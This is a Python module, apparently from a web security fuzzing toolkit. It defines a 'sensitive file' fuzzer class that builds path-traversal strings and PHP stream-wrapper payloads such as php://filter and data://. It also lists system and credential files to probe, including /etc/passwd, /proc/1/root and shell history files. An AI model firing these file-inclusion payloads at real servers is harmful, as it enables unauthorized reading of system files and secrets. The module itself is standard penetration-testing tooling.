#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class SFile(Fuzzer):

    """sensitive File"""

    generalports = [20, 21, 80]
    phpext = ['php', 'php3', 'php4', 'php5', 'php7', 'pht', 'phtml', 'shtml']

    def __init__(self):
        super(SFile, self).__init__()
        # windows max dir length
        self.winmax = 259
        # linux max dir length
        self.linuxmax = 4096

    @staticmethod
    def traverse(cnt=5, path="../"):
        return path * cnt

    @staticmethod
    def fakeProtocol(type, msg=""):
        if type == "php":
            return "php://input"
        elif type == "phpb64":
            return "php://filter/convert.base64-encode/resource=" + msg
        elif type == "textb64":
            return "data://text/plain;base64," + msg.encode("base64")
        elif type == "text":
            return "data://text/plain;" + msg
        elif type == "zip":
            return ["zip://", "bzip2://", "zlib://"][0] + msg

    @staticmethod
    def sourceCode(ext):
        l = ["app", "index", "main"]
        return list(map(lambda i: i+"."+ext, l))

    @staticmethod
    def list():
        return [
            "/dev/mem",
            "/etc/passwd",
            "/etc/crontab",
            "/etc/hosts",
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/var/log/syslog",
            "/var/log/syslog.1",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/www/html/index.php",
            "/proc/cpuinfo",
            "/proc/1/root",
            "/proc/1/status",
            ".bashrc",
            ".bash_history",
            ".gitconfig",
            ".profile",
            ".viminfo",
            ".zsh_history",
        ]
